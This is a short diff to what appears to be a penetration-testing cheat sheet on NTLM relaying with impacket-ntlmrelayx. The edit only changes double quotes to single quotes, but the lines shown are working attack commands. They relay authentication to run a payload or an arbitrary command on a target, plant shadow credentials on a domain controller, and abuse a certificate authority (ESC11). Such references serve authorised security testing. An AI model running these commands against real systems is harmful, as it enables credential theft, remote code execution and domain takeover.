@@ -32,7 +32,7 @@ impacket-ntlmrelayx -t <target> -smb2support -e <payload_file|payload.exe>
 
 ## ntlmrelay - execute command 
 ```
-impacket-ntlmrelayx --no-http-server -smb2support -t <target> -c "<COMMAND>"
+impacket-ntlmrelayx --no-http-server -smb2support -t <target> -c '<COMMAND>'
 ```
 
 ## ntlmrelay - socks option 1
@@ -95,5 +95,5 @@ impacket-ntlmrelayx -t ldap://<dc02> --shadow-credentials --shadow-target '<dc01
 
 ## ntlmrelay - ESC11 
 ```
-impacket-ntlmrelayx -t rpc://$PKI.<domain> -rpc-mode ICPR -icpr-ca-name <CA_NAME> -smb2support --template "<Template name>"
+impacket-ntlmrelayx -t rpc://$PKI.<domain> -rpc-mode ICPR -icpr-ca-name <CA_NAME> -smb2support --template '<Template name>'
 ```
